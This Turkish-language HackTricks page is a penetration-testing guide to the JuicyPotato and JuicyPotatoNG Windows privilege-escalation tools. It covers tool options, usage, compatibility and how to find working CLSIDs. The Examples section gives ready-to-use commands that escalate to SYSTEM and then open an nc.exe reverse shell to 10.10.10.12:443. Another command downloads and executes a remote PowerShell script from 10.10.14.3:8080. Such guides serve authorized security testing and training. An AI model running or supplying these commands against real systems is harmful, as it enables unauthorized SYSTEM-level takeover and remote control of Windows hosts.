# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato legacy'dir. Genellikle Windows 10 1803 / Windows Server 2016'ya kadar olan Windows sürümlerinde çalışır. Windows 10 1809 / Server 2019'dan itibaren yapılan Microsoft değişiklikleri özgün tekniği bozmuştur. Bu sürümler ve daha yenileri için PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato ve diğerleri gibi modern alternatifleri değerlendirin. Güncel seçenekler ve kullanım için aşağıdaki sayfaya bakın.

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (altın ayrıcalıkları kötüye kullanma) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

[_RottenPotatoNG_'nin](https://github.com/breenmachine/RottenPotatoNG) _biraz juice eklenmiş, geliştirilmiş bir sürümü; yani **Windows Service Accounts'tan NT AUTHORITY\SYSTEM'e Local Privilege Escalation sağlayan başka bir tool**_<sup>[[1]](#references)</sup>

#### juicypotato'yu [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) adresinden indirebilirsiniz

### Uyumluluk için kısa notlar

- Mevcut context'te SeImpersonatePrivilege veya SeAssignPrimaryTokenPrivilege olduğunda Windows 10 1803 ve Windows Server 2016'ya kadar güvenilir şekilde çalışır.
- Windows 10 1809 / Windows Server 2019 ve sonraki sürümlerde Microsoft hardening değişiklikleri nedeniyle çalışmaz. Bu sürümler için yukarıda bağlantısı verilen alternatifleri tercih edin.

### Özet <a href="#summary" id="summary"></a>

[**juicy-potato Readme'den**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) ve [varyantları](https://github.com/decoder-it/lonelypotato), MiTM listener'ı `127.0.0.1:6666` üzerinde bulunan [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) tabanlı ve `SeImpersonate` veya `SeAssignPrimaryToken` privilege'larına sahip olduğunuzda çalışan privilege escalation chain'inden yararlanır. Bir Windows build incelemesi sırasında `BITS`'in kasıtlı olarak devre dışı bırakıldığı ve `6666` portunun kullanımda olduğu bir setup bulduk.

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)'yi weaponize etmeye karar verdik: **Juicy Potato'ya merhaba deyin.**

> Teori için [Rotten Potato - Service Accounts'tan SYSTEM'e Privilege Escalation](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) yazısına bakın ve bağlantı ile referans zincirini takip edin.<sup>[[4]](#references)</sup>

`BITS` dışında çeşitli COM server'ları da abuse edilebilir. Bunların yalnızca şunları yapması gerekir:

1. mevcut user tarafından, genellikle impersonation privilege'larına sahip bir “service user” tarafından instantiate edilebilir olmak
2. `IMarshal` interface'ini implement etmek
3. elevated bir user (SYSTEM, Administrator, …) olarak çalışmak

Bazı Windows sürümlerinde yapılan testlerden sonra kapsamlı bir [ilginç CLSID listesi](http://ohpe.it/juicy-potato/CLSID/) elde edip test ettik.

### Juicy ayrıntıları <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato şunları yapmanıza olanak tanır:<sup>[[1]](#references)</sup>

- **Target CLSID** _istediğiniz herhangi bir CLSID'yi seçin._ [_Burada_](http://ohpe.it/juicy-potato/CLSID/) _OS'a göre düzenlenmiş listeyi bulabilirsiniz._
- **COM Listening port** _marshalled hardcoded 6666 yerine tercih ettiğiniz COM listening port'unu tanımlayın_
- **COM Listening IP address** _server'ı herhangi bir IP'ye bind edin_
- **Process creation mode** _impersonated user'ın privilege'larına bağlı olarak şunlardan birini seçebilirsiniz:_
- `CreateProcessWithToken` (`SeImpersonate` gerekir)
- `CreateProcessAsUser` (`SeAssignPrimaryToken` gerekir)
- `both`
- **Process to launch** _exploitation başarılı olursa bir executable veya script çalıştırın_
- **Process Argument** _çalıştırılan process'in argument'larını özelleştirin_
- **RPC Server address** _stealthy bir yaklaşım için external bir RPC server'a authenticate olabilirsiniz_
- **RPC Server port** _external bir server'a authenticate olmak istediğinizde ve firewall `135` portunu engellediğinde kullanışlıdır…_
- **TEST mode** _esas olarak test amaçlıdır; yani CLSID'leri test etmek için kullanılır. DCOM'u oluşturur ve token'ın user'ını yazdırır. Test için_ [_buraya bakın_](http://ohpe.it/juicy-potato/Test/)

### Kullanım <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Son düşünceler <a href="#final-thoughts" id="final-thoughts"></a>

[**juicy-potato Readme'den**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>

Kullanıcının `SeImpersonate` veya `SeAssignPrimaryToken` yetkileri varsa **SYSTEM** olursunuz.

Tüm bu COM Server'larının kötüye kullanılmasını önlemek neredeyse imkânsızdır. Bu nesnelerin izinlerini `DCOMCNFG` aracılığıyla değiştirmeyi düşünebilirsiniz; ancak iyi şanslar, bu zorlu olacaktır.

Asıl çözüm, `* SERVICE` hesapları altında çalışan hassas hesapları ve uygulamaları korumaktır. `DCOM`'u durdurmak bu exploit'i kesinlikle engeller; ancak temel işletim sistemi üzerinde ciddi bir etkiye neden olabilir.

Kaynak: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG (2022+)

JuicyPotatoNG, aşağıdakileri birleştirerek modern Windows üzerinde JuicyPotato tarzı bir local privilege escalation yöntemini yeniden kullanıma sunar:<sup>[[2]](#references)</sup>
- Eski sabit kodlanmış 127.0.0.1:6666 listener'ından kaçınarak, seçilen bir port üzerindeki local RPC server'a yönelik DCOM OXID çözümlemesi.
- RpcImpersonateClient gerektirmeden gelen SYSTEM authentication bilgisini yakalayıp impersonate etmek için bir SSPI hook'u; bu ayrıca yalnızca SeAssignPrimaryTokenPrivilege mevcut olduğunda CreateProcessAsUser kullanımını da mümkün kılar.
- DCOM activation kısıtlamalarını karşılamak için kullanılan yöntemler (örneğin, PrintNotify / ActiveX Installer Service sınıfları hedeflenirken gereken eski INTERACTIVE-group gereksinimi).

Önemli notlar (build'ler arasındaki davranışlar değişebilir):<sup>[[2]](#references)</sup>
- Eylül 2022: İlk teknik, “INTERACTIVE trick” kullanılarak desteklenen Windows 10/11 ve Server hedeflerinde çalışıyordu.
- Ocak 2023'te yazarlardan gelen güncelleme: Microsoft daha sonra INTERACTIVE trick'i engelledi. Farklı bir CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) exploitation'ı yeniden mümkün kılar; ancak yazılarındaki bilgilere göre bu yalnızca Windows 11 / Server 2022 üzerinde çalışır.

Temel kullanım (help bölümünde daha fazla flag bulunur):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Windows 10 1809 / Server 2019 hedefliyorsanız ve classic JuicyPotato patch’lenmişse, üstte bağlantıları verilen alternatifleri (RoguePotato, PrintSpoofer, EfsPotato/GodPotato vb.) tercih edin. NG, build ve service durumuna bağlı olarak durumsal olabilir.

## Examples

Not: Deneyebileceğiniz CLSID’lerin listesi için [bu sayfayı](https://ohpe.it/juicy-potato/CLSID/) ziyaret edin.

### Get a nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Yeni bir CMD başlatma (RDP erişiminiz varsa)

![Powershell rev - Yeni bir CMD başlatma (RDP erişiminiz varsa): Yeni bir CMD başlatma (RDP erişiminiz varsa)](<../../images/image (300).png>)

## CLSID Sorunları

JuicyPotato'nun kullandığı varsayılan CLSID çoğu zaman **çalışmaz** ve exploit başarısız olur. Genellikle **çalışan bir CLSID** bulmak için birden fazla deneme yapmak gerekir. Belirli bir işletim sistemi için denenebilecek CLSID'lerin listesini almak üzere şu sayfayı ziyaret etmelisiniz:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSID'leri Kontrol Etme**

Öncelikle juicypotato.exe dışında bazı executable dosyalara ihtiyacınız olacaktır.

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) dosyasını indirin ve PS session'ınıza yükleyin; ardından [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) dosyasını indirip çalıştırın. Bu script, test edilebilecek olası CLSID'lerin bir listesini oluşturacaktır.

Ardından [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) dosyasını indirin (CLSID listesinin ve juicypotato executable dosyasının yolunu değiştirin) ve çalıştırın. Her CLSID'yi denemeye başlayacak ve **port numarası değiştiğinde CLSID'nin çalıştığı anlamına gelecektir**.

Çalışan CLSID'leri **-c parametresini kullanarak kontrol edin**

## References

- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [JuicyPotato'ya ikinci bir şans vermek: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Juicy Potato proje sayfası (ohpe.it)](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - Service Account'larından SYSTEM'e Privilege Escalation](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
